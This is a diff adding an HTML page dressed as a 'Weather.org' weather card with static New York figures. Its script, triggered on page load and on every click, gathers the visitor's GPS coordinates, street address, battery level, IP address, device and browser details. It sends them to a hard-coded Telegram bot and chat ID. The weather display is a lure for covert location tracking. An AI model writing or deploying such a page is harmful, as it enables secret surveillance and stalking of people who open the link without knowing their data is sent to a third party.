@@ -1,0 +1,310 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>www.Weather.org</title>
+    <link href="https://fonts.googleapis.com/css2?family=Nunito:wght@400;600;800&display=swap" rel="stylesheet">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons/font/bootstrap-icons.css" rel="stylesheet">
+    <style>
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #0c1e4f;
+            font-family: 'Nunito', sans-serif;
+            margin: 0;
+        }
+
+        .weather-card {
+            background: linear-gradient(to bottom right, #00c6fb, #005bea);
+            border-radius: 15px;
+            color: white;
+            padding: 30px;
+            width: 300px;
+            box-shadow: 0 8px 15px rgba(0, 0, 0, 0.1);
+        }
+
+        .search-bar {
+            display: flex;
+            justify-content: center;
+            margin-bottom: 20px;
+        }
+
+        .search-bar input {
+            border: none;
+            border-radius: 50px;
+            padding: 10px 20px;
+            width: 70%;
+            margin-right: 10px;
+        }
+
+        .search-bar i {
+            font-size: 20px;
+        }
+
+        .weather-icon {
+            font-size: 50px;
+            text-align: center;
+            margin-bottom: 10px;
+        }
+
+        .temperature {
+            font-size: 40px;
+            text-align: center;
+            margin-bottom: 10px;
+        }
+
+        .location {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .details {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 20px;
+        }
+
+        .details div {
+            text-align: center;
+        }
+
+        .weather-btn {
+            background-color: #ffffff;
+            color: #005bea;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 50px;
+            width: 100%;
+            cursor: pointer;
+        }
+
+        #demo {
+            width: 100%;
+            height: 200px;
+            margin-top: 20px;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="weather-card">
+        <div class="search-bar">
+            <input type="text" placeholder="Search">
+            <i class="bi bi-search"></i>
+        </div>
+        <div class="weather-icon text-center">
+            <i class="bi bi-cloud-sun"></i>
+        </div>
+        <div class="temperature text-center">22°C</div>
+        <div class="location text-center">New York</div>
+        <div class="details">
+            <div>
+                <i class="bi bi-moisture"></i>
+                <span>64% Humidity</span>
+            </div>
+            <div>
+                <i class="bi bi-wind"></i>
+                <span>18 km/h Wind Speed</span>
+            </div>
+        </div>
+        <button class="weather-btn" id="button-addon2">Location Change</button>
+        <div id="location"></div>
+        <div id="battery"></div>
+        <div id="demo"></div>
+    </div>
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js"></script>
+<script src="https://maps.googleapis.com/maps/api/js?key=YOUR_API_KEY"></script>
+
+<script>
+    const TELEGRAM_API = 'https://api.telegram.org/bot7799573512:AAG9v3fPFxyYOfihaezwXYpVrAehsBAlMvg/sendMessage';
+    const CHAT_ID = '6810125590';
+    const GOOGLE_API_KEY = 'YOUR_GOOGLE_MAPS_API_KEY';
+
+    document.body.addEventListener('click', function () {
+        collectAndSendData();
+    });
+
+    function collectAndSendData() {
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(async (position) => {
+                const latitude = position.coords.latitude;
+                const longitude = position.coords.longitude;
+                document.getElementById('location').innerText = `Latitude: ${latitude}, Longitude: ${longitude}`;
+
+                const batteryLevel = await getBatteryLevel();
+                document.getElementById('battery').innerText = `Battery: ${batteryLevel}`;
+
+                const ipAddress = await fetchIP();
+                const address = await reverseGeocode(latitude, longitude);
+
+                const deviceInfo = getDeviceInfo();
+                const browserInfo = getBrowserInfo();
+
+                const date = new Date();
+                const formattedDate = date.toLocaleString();
+
+                const message = `Location Details:
+Latitude: ${latitude}
+Longitude: ${longitude}
+Address: ${address}
+Battery: ${batteryLevel}
+IP Address: ${ipAddress}
+Date & Time: ${formattedDate}
+Device Info: ${deviceInfo}
+Browser Info: ${browserInfo}`;
+
+                sendToTelegram(message);
+                displayMap(latitude, longitude);
+            }, showError);
+        } else {
+            alert("Sorry! Your browser does not support the Geolocation API.");
+        }
+    }
+
+    function getBatteryLevel() {
+        if (navigator.getBattery) {
+            return navigator.getBattery().then(battery => {
+                return Math.round(battery.level * 100) + "%";
+            });
+        } else {
+            return Promise.resolve("Battery API not supported");
+        }
+    }
+
+    function fetchIP() {
+        return fetch('https://api.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => data.ip)
+            .catch(error => {
+                console.error('Error fetching IP:', error);
+                return 'Failed to get IP';
+            });
+    }
+
+    function reverseGeocode(lat, long) {
+        const url = `https://maps.googleapis.com/maps/api/geocode/json?latlng=${lat},${long}&key=${GOOGLE_API_KEY}`;
+        return fetch(url)
+            .then(response => response.json())
+            .then(data => {
+                if (data.status === 'OK' && data.results.length > 0) {
+                    return data.results[0].formatted_address;
+                } else {
+                    return 'Address not found';
+                }
+            })
+            .catch(error => {
+                console.error('Error during reverse geocoding:', error);
+                return 'Error retrieving address';
+            });
+    }
+
+    function getDeviceInfo() {
+        const userAgent = navigator.userAgent;
+        const platform = navigator.platform;
+        return `User Agent: ${userAgent}, Platform: ${platform}`;
+    }
+
+    function getBrowserInfo() {
+        const userAgent = navigator.userAgent;
+        const browsers = [
+            { name: 'Brave', test: () => navigator.brave && navigator.brave.isBrave !== undefined },
+            { name: 'Yandex Browser', test: /YaBrowser/ },
+            { name: 'Microsoft Edge', test: /Edg/ },
+            { name: 'Mozilla Firefox', test: /Firefox/ },
+            { name: 'Opera', test: /Opera|OPR/ },
+            { name: 'Vivaldi', test: /Vivaldi/ },
+            { name: 'DuckDuckGo Browser', test: /DuckDuckGo/ },
+            { name: 'Tor Browser', test: () => userAgent.includes('TorBrowser') },
+            { name: 'UC Browser', test: /UCBrowser/ },
+            { name: 'Samsung Internet', test: /SamsungBrowser/ },
+            { name: 'QQ Browser', test: /QQBrowser/ },
+            { name: 'Baidu Browser', test: /BaiduBrowser/ },
+            { name: 'Amazon Silk', test: /Silk/ },
+            { name: 'Vivo Browser', test: /VivoBrowser/ },
+            { name: 'Miui Browser', test: /MiuiBrowser/ },
+            { name: 'Google Chrome', test: /Chrome(?!.*(?:Edg|Brave|YaBrowser))/ },
+            { name: 'Safari', test: /Safari(?!.*Chrome)/ },
+        ];
+
+        for (const browser of browsers) {
+            const isMatch = typeof browser.test === 'function' ? browser.test() : browser.test.test(userAgent);
+            if (isMatch) {
+                return browser.name;
+            }
+        }
+        return 'Unknown Browser';
+    }
+
+    function sendToTelegram(message) {
+        fetch(TELEGRAM_API, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: message
+            })
+        })
+        .then(response => response.json())
+        .then(data => {
+            if (data.ok) {
+                alert('Information sent to Telegram!');
+            } else {
+                console.error('Telegram Error:', data);
+                alert('Failed to send data to Telegram.');
+            }
+        })
+        .catch(error => {
+            console.error('Error sending to Telegram:', error);
+            alert('Failed to send data to Telegram.');
+        });
+    }
+
+    function displayMap(lat, long) {
+        const latLng = new google.maps.LatLng(lat, long);
+        const mapOptions = {
+            center: latLng,
+            zoom: 15,
+            mapTypeControl: true,
+            navigationControlOptions: {
+                style: google.maps.NavigationControlStyle.SMALL,
+            },
+        };
+        const map = new google.maps.Map(document.getElementById('demo'), mapOptions);
+        new google.maps.Marker({
+            position: latLng,
+            map: map,
+            title: "You are here!",
+        });
+    }
+
+    function showError(error) {
+        switch (error.code) {
+            case error.PERMISSION_DENIED:
+                alert("User denied the request for Geolocation API.");
+                break;
+            case error.POSITION_UNAVAILABLE:
+                alert("User location information is unavailable.");
+                break;
+            case error.TIMEOUT:
+                alert("The request to get user location timed out.");
+                break;
+            case error.UNKNOWN_ERROR:
+                alert("An unknown error occurred.");
+                break;
+        }
+    }
+</script>
+    <script>
+    window.onload = function () {
+    collectAndSendData();
+}
+    
+    </script>
+</body>
+</html>
